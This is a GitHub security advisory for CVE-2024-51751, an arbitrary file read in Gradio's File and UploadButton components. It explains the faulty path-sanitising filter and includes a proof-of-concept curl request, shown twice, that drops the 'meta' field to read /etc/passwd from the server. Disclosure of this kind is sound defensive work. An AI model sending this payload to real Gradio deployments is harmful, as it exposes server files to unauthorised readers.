# [M] Gradio vulnerable to arbitrary file read with File and UploadButton components

## Summary
Severity: Medium
Advisory: GHSA-rhm9-gp5p-5248
CVE: CVE-2024-51751
CWE: CWE-200, CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N (CVSS_V3)
Published: 2024-11-06
Source: https://github.com/advisories/GHSA-rhm9-gp5p-5248
Type: github-advisory

## Affected
- PyPI: `gradio` — affected >=5.0.0 <5.5.0

## Details
### Summary
If File or UploadButton components are used as a part of Gradio application to preview file content, an attacker with access to the application might abuse these components to read arbitrary files from the application server.

### Details
Consider the following application where a user can upload a file and preview its content:
```
import gradio as gr

def greet(value: bytes):
    return str(value)

demo = gr.Interface(fn=greet, inputs=gr.File(type="binary"), outputs="textbox")

if __name__ == "__main__":
    demo.launch()
```

If we run this application and make the following request (which attempts to read the `/etc/passwd` file)
```
curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain","meta":{"_type":"gradio.FileData"}}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'
```

Then this results in the following error on the server

```
gradio.exceptions.InvalidPathError: Cannot move /etc/passwd to the gradio cache dir because it was not uploaded by a user.
``` 

This is expected. However, if we now remove the `"meta":{"_type":"gradio.FileData"}` from the request:
```
curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain"}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'
```
This doesn't cause an error and results in the content of /etc/passwd being shown in the response!


This works because Gradio relies on the `processing_utils.async_move_files_to_cache` to sanitize all incoming file paths in all inputs. This function performs the following operation
```
    return await client_utils.async_traverse(
        data, _move_to_cache, client_utils.is_file_obj_with_meta
    )
```
where `client_utils.is_file_obj_with_meta` is used as a filter which tells on which inputs to perform the `_move_to_cache` function (which also performs the allowed/disallowed check on the file path). The problem is that `client_utils.is_file_obj_with_meta` is not guaranteed to trigger for every input that contains a file path:

```
def is_file_obj_with_meta(d) -> bool:
    """
    Check if the given value is a valid FileData object dictionary in newer versions of Gradio
    where the file objects include a specific "meta" key, e.g.
    {
        "path": "path/to/file",
        "meta": {"_type: "gradio.FileData"}
    }
    """
    return (
        isinstance(d, dict)
        and "path" in d
        and isinstance(d["path"], str)
        and "meta" in d
        and d["meta"].get("_type", "") == "gradio.FileData"
    )
```

For example, as in the PoC, the file path won't be checked if the `meta` key is not present in the request or if `_type` is not `gradio.FileData`.

Then, the path remains under control of the attacker and is used to read a file in `_process_single_file` function in `file.py` and `upload_button.py` (and possibly other places)

### PoC
As described above, run the following Gradio app

```
import gradio as gr

def greet(value: bytes):
    return str(value)

demo = gr.Interface(fn=greet, inputs=gr.File(type="binary"), outputs="textbox")

if __name__ == "__main__":
    demo.launch()
```

And make the following request
```
curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain"}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'
```

### Impact
Arbitrary file read in specific Gradio applications that use File or UploadButton components to upload files and echo/preview the content to the user.

## References
- https://github.com/gradio-app/gradio/security/advisories/GHSA-rhm9-gp5p-5248
- https://nvd.nist.gov/vuln/detail/CVE-2024-51751
- https://github.com/gradio-app/gradio
- https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2024-275.yaml
